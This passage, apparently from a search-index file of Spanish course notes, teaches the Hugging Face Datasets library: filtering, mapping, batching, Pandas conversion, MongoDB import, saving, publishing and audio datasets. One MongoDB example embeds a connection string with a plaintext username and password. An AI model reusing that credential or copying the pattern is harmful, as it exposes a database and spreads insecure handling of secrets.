<code>seed=333</code>:<ul> <li>El generador aleatorio se inicializa siempre igual.</li> <li>El orden barajado ser\u00e1 id\u00e9ntico en cada ejecuci\u00f3n, lo que permite reproducir experimentos.</li> </ul> </li> </ul> <p>\u2705 \u00bfPor qu\u00e9 es importante en Machine Learning?</p> <ul> <li>Consistencia: Si compartes c\u00f3digo con otros, obtendr\u00e1n el mismo resultado.</li> <li>Depuraci\u00f3n: Puedes repetir pruebas sin que el orden cambie.</li> <li>Comparaci\u00f3n justa: Cuando eval\u00faas modelos, necesitas que los datos sean los mismos en cada experimento.</li> </ul>"},{"location":"Datasets/Datasets/#seleccionando-filas","title":"Seleccionando filas","text":"<p>Para recuperar filas, usaremos el m\u00e9todo <code>Dataset.select()</code> pas\u00e1ndole un iterador con las posiciones a seleccionar:</p> <pre><code>tres_filas = squad_train_shuffled.select([5,10,15])\nseis_filas = squad_train_shuffled.select(range(6))\n</code></pre> <p>Si queremos seleccionar las filas por alg\u00fan criterio espec\u00edfico, debemos emplear <code>Dataset.filter()</code> y funciones lambda:</p> <pre><code>empieza_por_b_filas = squad_train_shuffled.filter(lambda x: x[\"title\"].startswith(\"B\"))\nfor i in range(empieza_por_b_filas.num_rows):\n    print(empieza_por_b_filas[i][\"title\"])\n# Beidou _ Navigation _ Satellite _ System (en ingl\u00e9s)\n# Biodiversidad\n# Boston ...\n</code></pre>"},{"location":"Datasets/Datasets/#trabajando-con-columnas","title":"Trabajando con columnas","text":"<p>Al trabajar con columnas, podemos a\u00f1adir una nueva mediante <code>Dataset.add_column()</code>, cambiarles el nombre con <code>DatasetDict.rename_column()</code> o eliminar una columna con <code>DatasetDict.remove_column()</code>:</p> <pre><code>nueva_columna = [\"nueva\"] * squad_train_shuffled.num_rows\nsquad_train_shuffled = squad_train_shuffled.add_column(name=\"inicial\",column=nueva_columna)\n# Dataset({\n#     features: ['title', 'paragraphs', 'inicial'],\n#     num_rows: 442\n# })\nsquad_train_shuffled = squad_train_shuffled.rename_column(\n    original_column_name=\"inicial\", new_column_name=\"modificada\"\n)\n# Dataset({\n#     features: ['title', 'paragraphs', 'modificada'],\n#     num_rows: 442\n# })\nsquad_train_shuffled = squad_train_shuffled.remove_columns([\"modificada\"])\n# Dataset({\n#     features: ['title', 'paragraphs'],\n#     num_rows: 442\n# })\n</code></pre>"},{"location":"Datasets/Datasets/#trabajando-con-map","title":"Trabajando con map","text":"<p>Y la joya de la corona es la funci\u00f3n <code>Dataset.map()</code> para aplicar una transformaci\u00f3n a medida. Por ejemplo, si queremos modificar todos los t\u00edtulos y pasarlos a min\u00fascula haremos:</p> <p>squad-map.py <pre><code>from datasets import load_dataset\n\nficheros_datos = {\"train\": \"train-v2.0-es.json\", \"test\": \"dev-v2.0-es.json\"}\nsquad_dataset = load_dataset(\"json\", data_files=ficheros_datos, field=\"data\")\nsquad_dataset = squad_dataset[\"train\"]\n\ndef titulo_minus(registro):\n    return {\"title\":registro[\"title\"].lower()}\n\nsquad_minus = squad_dataset.map(titulo_minus)\n\n# Mostramos 5 elementos\nprint(squad_minus.shuffle(seed=987)[\"title\"][:5])\n# ['marshall', 'ascensor', 'kanye', 'bbc televisi\u00f3n', 'florida']\n</code></pre></p> <p>Mediante la funci\u00f3n <code>map</code> tambi\u00e9n podemos crear nuevas columnas a partir de los valores de otras. Por ejemplo, a\u00f1adimos una nueva caracter\u00edstica con la cantidad de p\u00e1rrafos y quitamos toda la informaci\u00f3n existente previamente de los p\u00e1rrafos:</p> <pre><code># A\u00f1adimos nueva columna\nsquad_col_num_parrafos = squad_dataset.map(lambda x: {\"num_paragraphs\":len(x[\"paragraphs\"])})\n# Borramos la antigua\nsquad_col_num_parrafos = squad_col_num_parrafos.remove_columns(\"paragraphs\")\nprint(squad_col_num_parrafos.shuffle(seed=987)[:5])\n# {'title': ['Marshall', 'Ascensor', 'Kanye', 'BBC Televisi\u00f3n', 'Florida'], 'num_paragraphs': [51, 52, 79, 31, 35]}\n</code></pre> <p>\u00bfY si queremos ordenar los p\u00e1rrafos por la cantidad de p\u00e1rrafos? Para ello, podemos utilizar <code>Dataset.sort()</code>:</p> <pre><code>squad_num_parrafos_ordenados = squad_col_num_parrafos.sort(\"num_paragraphs\")\n\nprint(squad_num_parrafos_ordenados[:3]) # tres primeros\n# {'title': ['Tono _ (m\u00fasica)', 'Uva', 'Letra _ case'], 'num_paragraphs': [10, 10, 12]}\n\nprint(squad_num_parrafos_ordenados[-3:]) # tres \u00faltimos\n# {'title': ['American Idol (en ingl\u00e9s).', 'Nueva York', 'Budismo'], 'num_paragraphs': [127, 148, 149]}\n</code></pre>"},{"location":"Datasets/Datasets/#trabajando-con-batches","title":"Trabajando con batches","text":"<p>El m\u00e9todo <code>Dataset.map()</code> admite el argumento <code>batched</code> que, si se establece en <code>True</code>, hace que env\u00ede un lote de datos a la funci\u00f3n <code>map</code> a la vez (el tama\u00f1o del lote es configurable mediante el par\u00e1metro <code>batch_size</code>, pero por defecto es de 1000). Al indicar <code>batched=True</code>, la funci\u00f3n <code>map</code> recibe un diccionario con los campos del conjunto de datos, pero cada valor es ahora una lista de valores, y no un \u00fanico valor, y del mismo modo, devuelve un diccionario con los campos que queremos actualizar o a\u00f1adir a nuestro conjunto de datos, y una lista de valores.</p> <p>Por ello, debemos modificar la funci\u00f3n que realiza el <code>map</code> para que trabaje con un diccionario de listas.</p> <p>Para el siguiente ejemplo, vamos a coger el dataset de SQuAD_es desde Hugging Face que contiene m\u00e1s datos, y vamos a comparar el tiempo de ejecuci\u00f3n, recodificando la funci\u00f3n para trabajar con un diccionario que contiene una lista por cada campo:</p> <p>squad-map-batch.py <pre><code>from datasets import load_dataset\nimport time\n\n# Cargamos el dataset desde HF\nsquad_dataset = load_dataset(\"squad_es\", \"v2.0.0\", split=\"train\")  # (1)!\n\ndef titulo_minus(registro):\n    return {\"title\":registro[\"title\"].lower()}\n\ninicio = time.time()\nsquad_minus = squad_dataset.map(titulo_minus) # (2)!\n# Map: 100%|\u2588\u2588\u2588\u2588\u2588\u2588| 11858/11858 [00:00&lt;00:00, 37926.07 examples/s]   \nfin = time.time()\nprint(fin - inicio) # 3.008699893951416\n\ndef titulo_minus_batch(batch):\n    return {\"title\":[titulo.lower() for titulo in batch[\"title\"]]}\n\ninicio = time.time()\nsquad_minus = squad_dataset.map(titulo_minus_batch, batched=True) # (3)!\n# Map: 100%|\u2588\u2588\u2588\u2588\u2588\u2588| 11858/11858 [00:00&lt;00:00, 535210.67 examples/s]\nfin = time.time()\nprint(fin - inicio) # 0.19133710861206055\n</code></pre></p> <ol> <li>Cargamos los datos desde el dataset de Hugging Face</li> <li>El mapper normal realiza casi 40.000 registros por segundo</li> <li>Al hacerlo con batches realiza m\u00e1s de 500.000 por segundo</li> </ol>"},{"location":"Datasets/Datasets/#uso-de-pandas","title":"Uso de Pandas","text":"<p>Para facilitar la conversi\u00f3n entre diferentes formados, podemos usar el m\u00e9todo <code>Dataset.set_format()</code> para modificar el formato de salida (por ejemplo, a <code>pandas</code>, <code>numpy</code>, <code>torch</code>, <code>tensorflow</code>, <code>jax</code>, ...), sin modificar el formato original del dataset (el cual es Apache Arrow - <code>arrow</code>).</p> <p>As\u00ed, si por ejemplo queremos pasar los datos a Pandas para trabajar con ellos, transformarlos o visualizarlos, podemos hacer:</p> <pre><code>print(squad_dataset[0])\nsquad_dataset.set_format(\"pandas\")\ndf = squad_dataset[:]\nprint(df.shape) # (130313, 5)\n\n# Otra forma\ndf2 = squad_dataset.to_pandas()\nprint(df2.info())\n# &lt;class 'pandas.core.frame.DataFrame'&gt;\n# RangeIndex: 130313 entries, 0 to 130312\n# Data columns (total 5 columns):\n#  #   Column    Non-Null Count   Dtype \n# ---  ------    --------------   ----- \n#  0   id        130313 non-null  object\n#  1   title     130313 non-null  object\n#  2   context   130313 non-null  object\n#  3   question  130313 non-null  object\n#  4   answers   130313 non-null  object\n# dtypes: object(5)\n# memory usage: 5.0+ MB\n\n# Y realizar consultas sobre los datos, por ejemplo, la 5 preguntas con m\u00e1s respuestas\nprint(df2.groupby(\"title\")[\"answers\"].count().nlargest(5))\n# title\n# Reina                         883\n# Nueva York                    817\n# American Idol (en ingl\u00e9s).    790\n# Beyonc\u00e9 Knowles               753\n# Universidad                   738\n</code></pre> <p>Y para volver a tener un objeto <code>Dataset</code>, podemos utilizar el m\u00e9todo <code>Dataset.from_pandas()</code> o resetear el dataset que ten\u00edamos mediante <code>Dataset.reset_format()</code>:</p> <pre><code>squad_transformed = Dataset.from_pandas(df)\nsquad_original = squad_dataset.reset_format()\n</code></pre>"},{"location":"Datasets/Datasets/#creando-un-dataset-desde-cero","title":"Creando un dataset desde cero","text":"<p>Si en vez de cargar un dataset, tenemos que crear uno, el primer paso ser\u00e1 obtener los datos.</p> <p>Ya sea mediante peticiones a URL externas con la librer\u00eda <code>request</code>, accediendo a bases de datos relacionales, por ejemplo, mediante SQLAlchemy o a MongoDB mediante <code>PyMongo</code>, lo m\u00e1s normal es crear una estructura de datos mediante una lista o un diccionario y luego crear el dataset a partir del mismo.</p> <p>As\u00ed pues, si en vez de cargar un dataset queremos crear uno desde cero, podemos hacer uso de <code>Dataset.from_dict()</code> o <code>Dataset.from_list()</code> dependiendo de donde tengamos los datos. Por ejemplo, vamos a conectarnos a MongoDB y creamos una lista con todos los datos. A partir de la lista, generamos un Dataset:</p> <p>dataset-mongodb.py <pre><code>from datasets import Dataset\nfrom pymongo import MongoClient\n\ncliente = MongoClient('mongodb+srv://iabd:iabdiabd@cluster0.dfaz5er.mongodb.net')\n\n# Vamos a trabajar con la colecci\u00f3n grades de sample_training\niabd_db = cliente.sample_training\ngrades_coll = iabd_db.grades\n\n# Creamos un dataset vac\u00edo mediante una lista\ndocumentos = []\n\n# Recuperamos todas las calificaciones\ncursor = grades_coll.find({})\nfor document in cursor:\n  del document[\"_id\"]  # Quitamos el ObjectId\n  documentos.append(document)\n\nmongo_dataset = Dataset.from_list(documentos)\nprint(mongo_dataset)\n# Dataset({\n#     features: ['student_id', 'scores', 'class_id'],\n#     num_rows: 100000\n# })\n</code></pre></p> <p>O si queremos almacenar los datos de forma temporal, por ejemplo, podemos hacer uso de Pandas:</p> <pre><code>df = pd.DataFrame.from_records(documentos)\ndf.to_json(\"grades-docs.jsonl\", orient=\"records\", lines=True)\njsonl_dataset = load_dataset(\"json\", data_files=\"grades-docs.jsonl\", split=\"train\")\n</code></pre>"},{"location":"Datasets/Datasets/#persistiendo","title":"Persistiendo","text":"<p>Cuando cargamos un dataset se cachean los datos para evitar tener que descargar los datos de forma remota y crear las tablas de PyArrow. Podemos averiguar donde se almacenan los datos mediante la propiedad <code>cache_files</code>:</p> <pre><code>ficheros_datos = {\"train\": \"train-v2.0-es.json\", \"test\": \"dev-v2.0-es.json\"}\nsquad_dataset = load_dataset(\"json\", data_files=ficheros_datos, field=\"data\")\nprint(squad_dataset.cache_files)\n# {'train': [{'filename': '/Users/aitormedrano/.cache/huggingface/datasets/json/default-e3ff36a1d8fe78df/0.0.0/ab573428e7a11a7e23eebd41a2a71665ac3789ce311cbad7049572034a9bda05/json-train.arrow'}],\n#  'test': [{'filename': '/Users/aitormedrano/.cache/huggingface/datasets/json/default-e3ff36a1d8fe78df/0.0.0/ab573428e7a11a7e23eebd41a2a71665ac3789ce311cbad7049572034a9bda05/json-test.arrow'}]}\n</code></pre> <p>Si necesitamos persistir los datos de nuevo con las transformaciones realizadas, podemos hacerlo en diferentes formatos:</p> <ul> <li>Arrow: <code>Dataset.save_to_disk()</code></li> <li>CSV: <code>Dataset.to_csv()</code></li> <li>Pandas: <code>Dataset.to_pandas()</code></li> <li>JSON: <code>Dataset.to_json()</code></li> <li>Parquet: <code>Dataset.to_parquet()</code></li> </ul> <p>Si por ejemplo persistimos el dataset en Arrow:</p> <pre><code>squad_dataset.save_to_disk(\"squad_train_test\")\n</code></pre> <p>Se crear\u00e1 la siguiente estructura en las carpetas, donde para cada split se ha creado su propia carpeta, as\u00ed como un par de archivos con metadatos:</p> <pre><code>squad_train_test\n\u251c\u2500\u2500 dataset_dict.json\n\u251c\u2500\u2500 test\n\u2502   \u251c\u2500\u2500 data-00000-of-00001.arrow\n\u2502   \u251c\u2500\u2500 dataset_info.json\n\u2502   \u2514\u2500\u2500 state.json\n\u2514\u2500\u2500 train\n    \u251c\u2500\u2500 data-00000-of-00001.arrow\n    \u251c\u2500\u2500 dataset_info.json\n    \u2514\u2500\u2500 state.json\n</code></pre> <p>Una vez que hemos persistido el dataset, lo podemos volver a cargar mediante <code>load_from_disk</code>:</p> <pre><code>from datasets import load_from_disk\nsquad_disk = load_from_disk(\"squad_train_test\")\n</code></pre> <p>Si queremos persistirlos en formato CSV o JSON, por cada uno de los splits se crea un archivo separado. Para ello, podemos iterar sobre las claves mediante <code>DatasetDict.items()</code>:</p> <pre><code>for split, dataset in squad_dataset.items():\n    dataset.to_json(f\"squad_{split}.jsonl\")\n</code></pre>"},{"location":"Datasets/Datasets/#publicando","title":"Publicando","text":"<p>Pues una vez hemos creado nuestro Dataset y lo hemos persistido en disco, el \u00fanico paso que nos queda es publicar en Hugging Face. Para ello, en vez de subir los archivos a mano como hicimos en la sesi\u00f3n inicial desde el interfaz web o hacer uso de Git y copiar los archivos, desde Python es mucho m\u00e1s c\u00f3modo.</p> <p>Previamente debemos realizar login para autenticarnos, tal como vimos en la secci\u00f3n de Login de la sesi\u00f3n anterior y usar nuestro token de acceso (en este caso, necesitamos que nuestro token sea de escritura):</p> <pre><code>hf auth login\n</code></pre> <p>Login desde un cuaderno Jupyter / Colab</p> <p>Si trabajamos con un cuaderno de Jupyter o Colab, podemos utilizar la librer\u00eda de huggingface_hub y al ejecutarlo, nos aparecer\u00e1 una ventana donde introducir el token de acceso:</p> <pre><code>from huggingface_hub import login\nlogin()\n</code></pre> <p> Login desde un notebook </p> <p>Tambi\u00e9n podemos hacer uso de la variable de entorno <code>HF_TOKEN</code> para almacenar el token de acceso, ya sea con un Space almacen\u00e1ndolo en un secret de Spaces o en claves privadas de Google Colab.</p> <p>Una vez autenticado, es tan sencillo como usar el m\u00e9todo <code>push_to_hub()</code> (si queremos publicar el dataset como privado, le a\u00f1adimos el par\u00e1metro <code>private=True</code>):</p> <pre><code>midataset.push_to_hub(\"aitor-medrano/midatasetpushed\")\n# midataset.push_to_hub(\"aitor-medrano/midatasetpushed\", private=True)\n</code></pre> <p>Si tuvi\u00e9ramos diferentes splits podr\u00edamos hacer:</p> <pre><code>train_dataset.push_to_hub(\"aitor-medrano/midatasetpushed\", split=\"train\")\nval_dataset.push_to_hub(\"aitor-medrano/midatasetpushed\", split=\"validation\")\n</code></pre> <p>Creando el dataset card</p> <p>Para crear el dataset card, podemos emplear la aplicaci\u00f3n https://huggingface.co/spaces/huggingface/datasets-tagging que facilita rellenar los campos e incluye recomendaciones de otros datasets.</p> <p>Tambi\u00e9n se recomienda leer la Dataset Card Creation Guide</p>"},{"location":"Datasets/Datasets/#datasets-multimedia","title":"Datasets multimedia","text":"<p>Si nuestro dataset va a contener elementos multimedia con im\u00e1genes o audios, podemos subir los archivos en crudo, lo cual es lo m\u00e1s practico en la mayor\u00eda de los casos. Si los dataset de im\u00e1genes o audios son muy grandes, se recomienda el formato WebDataset, aunque lo m\u00e1s normal, es almacenar el dataset en formato Parquet.</p> <p>Dicho esto, vamos a ver como trabajar con datasets que contienen elementos multimedia.</p>"},{"location":"Datasets/Datasets/#audios","title":"Audios","text":"<p>Para trabajar con audios, necesitaremos instalar las librer\u00edas de audio:</p> <pre><code>pip install datasets[audio]\n</code></pre> <p>Una vez instalado, vamos a cargar un dataset que contiene audios, como es PolyAI/minds14:</p> <p>audio_minds.py <pre><code>from datasets import load_dataset\n\nminds = load_dataset(\"PolyAI/minds14\", name=\"es-ES\", split=\"train\")\nprint(minds)\n# Dataset({\n#     features: ['path', 'audio', 'transcription', 'english_transcription', 'intent_class', 'lang_id'],\n#     num_rows: 486\n# })\n</code></pre></p> <p>El dataset contiene 486 archivos de audio, cada uno de los cuales va acompa\u00f1ado de una transcripci\u00f3n, una traducci\u00f3n al ingl\u00e9s y una etiqueta que indica la intenci\u00f3n de la consulta de la persona. La columna de audio contiene los datos de audio sin procesar. Veamos uno de los ejemplos:</p> <pre><code>{'path': '/home/jupyter-iabd/.cache/huggingface/datasets/downloads/extracted/a809f65b01ef0d5806ac705a72b9ca382622a5c03d9a17adf1ee73de4591650b/es-ES~APP_ERROR/60266571dc3604f481bcb50a.wav',\n 'audio': {'path': '/home/jupyter-iabd/.cache/huggingface/datasets/downloads/extracted/a809f65b01ef0d5806ac705a72b9ca382622a5c03d9a17adf1ee73de4591650b/es-ES~APP_ERROR/60266571dc3604f481bcb50a.wav',\n    'array': array([ 0.        ,  0.        ,  0.        , ...,  0.        ,\n            -0.00024414, -0.00024414]),\n    'sampling_rate': 8000\n },\n 'transcription': 'hola buenas a ver tengo un problema con vuestra aplicaci\u00f3n resulta que quiero hacer una transferencia bancaria a una cuenta conocida',\n 'english_transcription': 'hello good to see I have a problem with your application it turns out that I want to make a bank transfer to a known account',\n 'intent_class': 2,\n 'lang_id': 5}\n</code></pre> <p>Si nos centramos en el campo <code>audio</code>, vemos como contiene diferentes valores, los cuales forman parte de un objeto <code>Audio</code>:</p> <ul> <li><code>path</code>: ruta al archivo de audio (en este ejemplo <code>*.wav</code>).</li> <li><code>array</code>: los datos del audio decodificados, representados por un array de NumPy</li> <li><code>sampling_rate</code>: la frecuencia de muestreo (8,000 Hz).</li> </ul> <pre><code>ejemplo = minds.shuffle()[0]\n\nid2label = minds.features[\"intent_class\"].int2str\nlabel = id2label(ejemplo[\"intent_class\"])\n</code></pre> <p>Y si queremos escuchar el audio, usando Gradio podemos crear un componente:</p> <p>audio_app.py</p> <pre><code>import gradio as gr\nfrom datasets import load_dataset\n\n# Cargar el dataset\nminds = load_dataset(\"PolyAI/minds14\", name=\"es-ES\", split=\"train\")\n\n# Obtener un audio aleatorio del dataset\naudio = minds.shuffle()[0]\n\n#obtenemos el audio decodificado (que devuelve un objeto AudioDecoder)\naudio_decode = audio[\"audio\"]\n\n# Etiqueta de intenci\u00f3n\nid2label = minds.features[\"intent_class\"].int2str\nprint(id2label)\n#Usando la funci\u00f3n anterior, toma el identificador de intenciones del ejemplo \n# y lo convierte en su nombre textual \n# para saber qu\u00e9 clase de intento representa ese dato.\nintent_id = audio[\"intent_class\"]\nlabel = id2label(intent_id)\n\n#print(label.names[])\n\ndef load_audio():\n    return (audio_decode[\"sampling_rate\"], audio_decode[\"array\"])\n\n# Crear la interfaz de Gradio\nwith gr.Blocks() as demo:\n    gr.Markdown(\"# Reproductor de Audio - Dataset PolyAI/minds14\")\n\n    audio_component = gr.Audio(\n        value=load_audio(),\n        label=label,\n        interactive=False\n    )\n\ndemo.launch(share=True)\n</code></pre> <p>Y reproducir el audio seleccionado:</p> Reproduciendo un audio desde Gradio <p>Finalmente, si queremos mostrar un gr\u00e1fico con el espectograma del audio, y haciendo uso de la librer\u00eda Librosa:</p> <pre><code>import librosa\nimport matplotlib.pyplot as plt\nimport librosa.display\n\narray = ejemplo[\"audio\"][\"array\"]\nsampling_rate = ejemplo[\"audio\"][\"sampling_rate\"]\n\nplt.figure().set_figwidth(12)\nlibrosa.display.waveshow(array, sr=sampling_rate)\n</code></pre> <p>Obteniendo:</p> Representaci\u00f3n gr\u00e1fica de un audio"},{"location":"Datasets/Datasets/#creando-un-dataset-desde-python","title":"Creando un dataset desde Python","text":"<p>Si queremos crear un dataset a partir de audios propios, necesitamos crear un diccionario o una lista con la ruta a nuestros audios, y a continuaci\u00f3n, llamar al m\u00e9todo <code>cast_column</code> para transformar la columna a tipo <code>Audio</code> con las caracter\u00edsticas que hemos visto antes.</p> <p>As\u00ed pues, si tenemos los datos en un diccionario podemos hacer:</p> <pre><code>audio_dataset = Dataset.from_dict({\"audio\": [\"path/to/audio_1\", \"path/to/audio_2\", ..., \"path/to/audio_n\"]}).cast_column(\"audio\", Audio())\n</code></pre>"},{"location":"Datasets/Datasets/#audiofolder","title":"Audiofolder","text":"<p>Otra posibilidad es crear el dataset a partir de una carpeta con todos los audios, y un archivo <code>metadata.csv</code> con los datos:</p> <pre><code>folder/train/metadata.csv\nfolder/train/first_audio_file.mp3\nfolder/train/second_audio_file.mp3\nfolder/train/third_audio_file.mp3\n</code></pre> <p>Y un archivo de metadatos con:</p> <p>metadata.csv <pre><code>file_name,transcription\nfirst_audio_file.mp3,este es el texto del primer audio\nsecond_audio_file.mp3,en el segundo audio cuento un chiste\nthird_audio_file.mp3,y en este audio agradezco al p\u00fablico sus abucheos\n</code></pre></p> <p>Y a continuaci\u00f3n, indicamos como primer par\u00e1metro <code>autofolder</code> y con <code>data_dir</code> indicamos la carpeta que contiene los audios:</p> <pre><code>from datasets import load_dataset\n\ndataset = load_dataset(\"audiofolder\", data_dir=\"/path/to/folder\")\n</code></pre>"},{"location":"Datasets/Datasets/#recursos","title":"\ud83d\udd17 Recursos","text":"<ul> <li>Hugging Face Datasets</li> <li>Documentaci\u00f3n oficial</li> <li>Documentaci\u00f3n oficial de dataset</li> <li>El cap\u00edtulo La librer\u00eda Dataset del curso NLP de Hugging Face.</li> </ul>"},{"location":"Datasets/Datasets/#actividades","title":"Actividades","text":"<ol> <li> <p>(RAPIA.3 / CEPIA.3b, CEPIA.3c / 2.5p) Siguiendo el ejemplo inicial trabajado en la sesi\u00f3n y s\u00f3lo empleando Python:</p> <ol> <li>Descarga los datos de SquadES considerando que los datos remotos son los de entrenamiento y validaci\u00f3n.</li> <li>Con lo datos de entrenamiento, div\u00eddelos en entrenamiento y pruebas.</li> <li>Tras ello, sobre el dataset de entrenamiento, a\u00f1ade una columna a los datos de entrenamiento con la cantidad de p\u00e1rrafos.</li> <li>Filtra los datos de entrenamiento para que el dataset s\u00f3lo contenga aquellos registros que tienen m\u00e1s de 10 p\u00e1rrafos.</li> <li>Elimina la columna con la cantidad de p\u00e1rrafos.</li> <li>Persiste todo el dataset en formato Parquet.</li> <li>Finalmente, publ\u00edcalo en Hugging Face, editando la tarjeta y poniendo un documento de ejemplo en la documentaci\u00f3n.</li> </ol> </li> <li> <p>(RAPIA.3 / CEPIA.3b, CEPIA.3c / 0.5p) Carga en streaming el dataset de imagenet-1k, y muestra la etiqueta de los primeros 5 elementos.</p> </li> <li> <p>(RAPIA.3 / CEPIA.3b, CEPIA.3c / 1p) Tenemos un dataset con informaci\u00f3n sobre vuelos retrasados en Espa\u00f1a y otro con informaci\u00f3n general sobre los aeropuertos. Se pide:</p> <ol> <li>Une ambos datasets para que la informaci\u00f3n de los vuelos contengan el nombre y la ciudad de los aeropuertos.</li> <li>Persiste los datos (sin elementos repetidos) en un dataset en formato Arrow.</li> <li>Publ\u00edcalo en Hugging Face.</li> </ol> </li> <li> <p>(RAPIA.3 / CEPIA.3b, CEPIA.3c / opcional ) Sobre la base de datos de MongoDB de <code>sample_training</code> disponible en los datos de muestra de MongoAtlas:</p> <ol> <li>Carga los de estados de <code>states.js</code>.</li> <li>Realiza una join entre las colecciones <code>zips</code> y <code>states</code>.</li> <li>Persiste los datos (sin elementos repetidos) en un dataset en formato JSON.</li> <li>Publ\u00edcalo en Hugging Face.</li> </ol> </li> </ol>"},{"location":"Datasets/datasets_aitor/","title":"Cargando datasets en HuggingFace (apuntes de Aitor Medrano)","text":"<p>Ya hemos visto que podemos utilizar diferentes datasets existentes en la plataforma para re-entrenar nuestros modelos.</p> <p>En esta sesi\u00f3n vamos a estudiar c\u00f3mo crear un dataset a partir de nuestros datos, limpiar un dataset, a reducirlo para que quepa en RAM y como tras crear nuestro dataset, subirlo al Hub.</p>","tags":["HuggingFace"]},{"location":"Datasets/datasets_aitor/#cargando-datos","title":"Cargando datos","text":"<p>Para cargar datos, haremos uso de la funci\u00f3n <code>load_dataset()</code> de la librer\u00eda Datasets. Si fuera necesaria instalarla, mediante <code>pip</code> har\u00edamos:</p> <pre><code>pip install datasets\n</code></pre> <p>Podemos cargar archivos con diferentes formatos indicando el formato y los datos:</p> <pre><code># CSV &amp; TSV\nload_dataset(\"csv\", data_files=\"mis_datos.csv\")\n# Texto\nload_dataset(\"text\", data_files=\"mis_datos.txt\")\n# JSON &amp; JSONL\nload_dataset(\"json\", data_files=\"mis_datos.jsonl\")\n</code></pre> <p>Para este apartado nos vamos a centrar en los datos de SQuAD (Stanford Question Answering Dataset), compuesto de un conjunto de art\u00edculos de Wikipedia, con respuestas a diferentes preguntas sobre los art\u00edculos. En nuestro caso, nos vamos a centrar en una versi\u00f3n en castellano que podemos ver en https://huggingface.co/datasets/squad_es o descargarlo de desde https://github.com/ccasimiro88/TranslateAlignRetrieve/tree/master/SQuAD-es-v2.0.</p> <p>Si descargamos los archivos y los colocamos en la misma carpeta que el siguiente script, podemos realizar una carga local de los datos:</p> squad-es-local.py<pre><code>from datasets import load_dataset\n\nsquad_dataset = load_dataset(\"json\", data_files=\"train-v2.0-es.json\", field=\"data\")\n\nprint(squad_dataset)\n</code></pre> <p>Tras ejecutarlo, nos muestra que al cargar el dataset ha creado un split para train, con la cantidad de filas y las columnas contenidas dentro de un <code>DatasetDict</code>:</p> <pre><code>Generating train split: 442 examples [00:00, 1211.02 examples/s]\nDatasetDict({\n    train: Dataset({\n        features: ['title', 'paragraphs'],\n        num_rows: 442\n    })\n})\n</code></pre> <p>Si queremos obtener m\u00e1s informaci\u00f3n, podemos mostrar las caracter\u00edsticas:</p> <pre><code>print(squad_dataset[\"train\"].features)\n# {'title': Value(dtype='string', id=None),\n#  'paragraphs': [\n#     {'context': Value(dtype='string', id=None),\n#      'qas': [\n#         {'answers': [{'answer_start': Value(dtype='int64', id=None), 'text': Value(dtype='string', id=None)}],\n#          'id': Value(dtype='string', id=None),\n#          'is_impossible': Value(dtype='bool', id=None),\n#          'plausible_answers': [{'answer_start': Value(dtype='int64', id=None), 'text': Value(dtype='string', id=None)}],\n#          'question': Value(dtype='string', id=None)}]\n#     }\n#  ]\n# }\n</code></pre> <p>Y al tratarse de un diccionario, podemos navegar mediante los corchetes para, por ejemplo, recuperar parte de los datos:</p> <pre><code>print(squad_dataset[\"train\"][0][\"title\"])\n# Beyonc\u00e9 Knowles\nprint(squad_dataset[\"train\"][0][\"paragraphs\"][0])\n# {'context': 'Beyonc\u00e9 Giselle Knowles-Carter (nacida el 4 de septiembre de 1981)..',\n # 'qas': [\n    # {'answers': [{'answer_start': 246, 'text': 'a finales de 1990'}],\n    #  'id': '56be85543aeaaa14008c9063', 'is_impossible': False, 'plausible_answers': None, 'question': '\u00bfCu\u00e1ndo Beyonce comenz\u00f3 a ser popular?'},\n    # {'answers': ...\n</code></pre> <p>Cuando cargamos un dataset, realmente queremos cargar los datos de entrenamiento y los de validaci\u00f3n. Para ello, le pasaremos un diccionario con los diferentes archivos para <code>train</code> y para <code>val</code>:</p> <pre><code>ficheros_datos = {\"train\": \"train-v2.0-es.json\", \"val\": \"dev-v2.0-es.json\"}\nsquad_dataset_train = load_dataset(\"json\", data_files=ficheros_datos, field=\"data\")\n</code></pre> <p>Obteniendo:</p> <pre><code>DatasetDict({\n    train: Dataset({\n        features: ['title', 'paragraphs'],\n        num_rows: 442\n    })\n    val: Dataset({\n        features: ['title', 'paragraphs'],\n        num_rows: 35\n    })\n})\n</code></pre> <p>Si queremos cargar \u00fanicamente una de las partes, le pasaremos el par\u00e1metro <code>split</code> con el valor deseado:</p> <pre><code>ficheros_datos = {\"train\": \"train-v2.0-es.json\", \"val\": \"dev-v2.0-es.json\"}\nsquad_dataset_train = load_dataset(\"json\", data_files=ficheros_datos, field=\"data\", split=\"train\")\nprint(squad_dataset_train)\n</code></pre> <p>Si el dataset est\u00e1 en un archivo comprimido en gzip, zip o tar, la librer\u00eda descomprimir\u00e1 los datos autom\u00e1ticamente:</p> <pre><code>ficheros_datos = {\"train\": \"train-v2.0-es.json.zip\", \"val\": \"dev-v2.0-es.json.zip\"}\nsquad_dataset_trainval = load_dataset(\"json\", data_files=ficheros_datos, field=\"data\")\nprint(squad_dataset_trainval)\n</code></pre>","tags":["HuggingFace"]},{"location":"Datasets/datasets_aitor/#carga-remota","title":"Carga remota","text":"<p>Si el dataset est\u00e1 almacenado en una URL remota, podemos cargarlos directamente:</p> squad-es-remoto.py<pre><code>from datasets import load_dataset\n\nurl = \"https://raw.githubusercontent.com/ccasimiro88/TranslateAlignRetrieve/master/SQuAD-es-v2.0/\"\n\nficheros_datos = {\n    \"train\": url + \"train-v2.0-es.json\",\n    \"val\": url + \"dev-v2.0-es.json\",\n}\nsquad_remote_dataset = load_dataset(\"json\", data_files=ficheros_datos, field=\"data\")\n\nprint(squad_remote_dataset)\n</code></pre>","tags":["HuggingFace"]},{"location":"Datasets/datasets_aitor/#dividiendo-el-dataset","title":"Dividiendo el dataset","text":"<p>Si en vez de cargar por separado los datos de entrenamiento y los de test, tenemos un \u00fanico conjunto de datos, podemos dividirlo mediante el m\u00e9todo <code>Dataset.train_test_split()</code> indicando el tama\u00f1o, por ejemplo, de los datos de test:</p> squad-es-split.py<pre><code>from datasets import load_dataset\n\nsquad_dataset = load_dataset(\"json\", data_files=\"train-v2.0-es.json\", field=\"data\", split=\"train\")\nsquad_split_dataset = squad_dataset.train_test_split(test_size=0.1)\nprint(squad_split_dataset)\n</code></pre> <p>De manera que pasamos de un dataset de 442 filas a uno dividido en 397 para entrenamiento y 45 para test:</p> <pre><code>DatasetDict({\n    train: Dataset({\n        features: ['title', 'paragraphs'],\n        num_rows: 397\n    })\n    test: Dataset({\n        features: ['title', 'paragraphs'],\n        num_rows: 45\n    })\n})\n</code></pre>","tags":["HuggingFace"]},{"location":"Datasets/datasets_aitor/#cargando-en-pandas","title":"Cargando en 